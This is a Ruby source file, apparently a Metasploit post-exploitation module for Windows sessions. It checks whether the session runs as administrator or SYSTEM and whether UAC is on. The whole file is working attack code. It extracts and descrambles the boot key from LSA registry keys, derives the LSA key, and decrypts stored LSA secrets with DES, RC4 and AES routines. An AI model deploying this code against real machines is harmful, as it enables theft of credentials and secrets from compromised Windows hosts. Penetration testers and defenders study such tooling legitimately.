# -*- coding: binary -*-

require 'msf/core/post/windows/accounts'

module Msf::Post::Windows::Priv
  include ::Msf::Post::Windows::Accounts

  #
  # Returns true if user is admin and false if not.
  #
  def is_admin?
    if session_has_ext
      # Assume true if the OS doesn't expose this (Windows 2000)
      session.railgun.shell32.IsUserAnAdmin()["return"] rescue true
    else
      cmd = "cmd.exe /c reg query HKU\\S-1-5-19"
      results = session.shell_command_token_win32(cmd)
      if results =~ /Error/
        return false
      else
        return true
      end
    end
  end

  #
  # Returns true if running as Local System
  #
  def is_system?
    if session_has_ext
      local_sys = resolve_sid("S-1-5-18")
      if session.sys.config.getuid == "#{local_sys[:domain]}\\#{local_sys[:name]}"
        return true
      else
        return false
      end
    else
      cmd = "cmd.exe /c reg query HKLM\\SAM\\SAM"
      results = session.shell_command_token_win32(cmd)
      if results =~ /Error/
        return false
      else
        return true
      end
    end
  end

  #
  # Returns true if UAC is enabled
  #
  # Returns false if the session is running as system, if uac is disabled or
  # if running on a system that does not have UAC
  #
  def is_uac_enabled?
    uac = false
    winversion = session.sys.config.sysinfo['OS']

    if winversion =~ /Windows (Vista|7|2008)/
      if session.sys.config.getuid != "NT AUTHORITY\\SYSTEM"
        begin
          key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',KEY_READ)

          if key.query_value('EnableLUA').data == 1
            uac = true
          end

          key.close
        rescue::Exception => e
          print_error("Error Checking UAC: #{e.class} #{e}")
        end
      end
    end
    return uac
  end

  #
  # Return true if the session has extended capabilities (ie meterpreter)
  #
  def session_has_ext
    begin
      return !!(session.railgun and session.sys.config)
    rescue NoMethodError
      return false
    end
  end

  #
  # Returns the unscrambled bootkey
  #
  def capture_boot_key
    bootkey = ""
    basekey = "System\\CurrentControlSet\\Control\\Lsa"

    %W{JD Skew1 GBG Data}.each do |k|
      begin
        ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, basekey + "\\" + k, KEY_READ)
      rescue Rex::Post::Meterpreter::RequestError
      end

      return nil if not ok
      bootkey << [ok.query_class.to_i(16)].pack("V")
      ok.close
    end

    keybytes = bootkey.unpack("C*")
    descrambled = ""
    descrambler = [ 0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04 ]

    0.upto(keybytes.length-1) do |x|
      descrambled << [keybytes[descrambler[x]]].pack("C")
    end

    return descrambled
  end

  #
  # Converts DES 56 to DES 64
  #
  def convert_des_56_to_64(kstr)
    des_odd_parity = [
      1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
      16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
      32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
      49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
      64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
      81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
      97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
      112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
      128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
      145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
      161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
      176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
      193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
      208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
      224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
      241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
    ]

    key = []
    str = kstr.unpack("C*")

    key[0] = str[0] >> 1
    key[1] = ((str[0] & 0x01) << 6) | (str[1] >> 2)
    key[2] = ((str[1] & 0x03) << 5) | (str[2] >> 3)
    key[3] = ((str[2] & 0x07) << 4) | (str[3] >> 4)
    key[4] = ((str[3] & 0x0F) << 3) | (str[4] >> 5)
    key[5] = ((str[4] & 0x1F) << 2) | (str[5] >> 6)
    key[6] = ((str[5] & 0x3F) << 1) | (str[6] >> 7)
    key[7] = str[6] & 0x7F

    0.upto(7) do |i|
      key[i] = ( key[i] << 1)
      key[i] = des_odd_parity[key[i]]
    end
    return key.pack("C*")
  end

  #
  # Returns the LSA key upon input of the unscrambled bootkey
  #
  def capture_lsa_key(bootkey)
    vprint_status("Getting PolSecretEncryptionKey...")
    pol = registry_getvaldata("HKLM\\SECURITY\\Policy\\PolSecretEncryptionKey", "")
    if pol
      print_status("XP or below client")
      @vista = 0
      md5x = Digest::MD5.new()
      md5x << bootkey
      (1..1000).each do
        md5x << pol[60,16]
      end

      rc4 = OpenSSL::Cipher::Cipher.new("rc4")
      rc4.key = md5x.digest
      lsa_key  = rc4.update(pol[12,48])
      lsa_key << rc4.final
      lsa_key = lsa_key[0x10..0x1F]
    else
      print_status("Vista or above client")
      @vista = 1

      vprint_status("Trying 'V72' style...")
      vprint_status("Getting PolEKList...")
      pol = registry_getvaldata("HKLM\\SECURITY\\Policy\\PolEKList", "")

      # If that didn't work, then we're out of luck
      return nil if pol.nil?

      lsa_key = decrypt_lsa_data(pol, bootkey)
      lsa_key = lsa_key[68,32]
    end

    vprint_good(lsa_key.unpack("H*")[0])
    return lsa_key
  end

  # Decrypts the LSA encrypted data
  #
  # @param pol [String] The policy key stored in the registry
  # @param encrypted_key [String]
  # @return [String] The decrypted data
  def decrypt_lsa_data(pol, encrypted_key)

    sha256x = Digest::SHA256.new()
    sha256x << encrypted_key
    (1..1000).each do
      sha256x << pol[28,32]
    end

    aes = OpenSSL::Cipher::Cipher.new("aes-256-cbc")
    aes.key = sha256x.digest

    vprint_status("digest #{sha256x.digest.unpack("H*")[0]}")

    decrypted_data = ''

    for i in (60...pol.length).step(16)
      aes.decrypt
      aes.padding = 0
      xx = aes.update(pol[i...i+16])
      decrypted_data << xx
    end

    return decrypted_data
  end

  # Decrypts "Secret" encrypted data
  #
  # Ruby implementation of SystemFunction005. The original python code
  # has been taken from Credump
  #
  # @param secret [String]
  # @param key [String]
  # @return [String] The decrypted data
  def decrypt_secret_data(secret, key)

    j = 0
    decrypted_data = ''

    for i in (0...secret.length).step(8)
      enc_block = secret[i..i+7]
      block_key = key[j..j+6]
      des_key = convert_des_56_to_64(block_key)
      d1 = OpenSSL::Cipher::Cipher.new('des-ecb')

      d1.padding = 0
      d1.key = des_key
      d1o = d1.update(enc_block)
      d1o << d1.final
      decrypted_data += d1o
      j += 7
      if (key[j..j+7].length < 7 )
        j = key[j..j+7].length
      end
    end
    dec_data_len = decrypted_data[0].ord

    return decrypted_data[8..8+dec_data_len]

  end

end
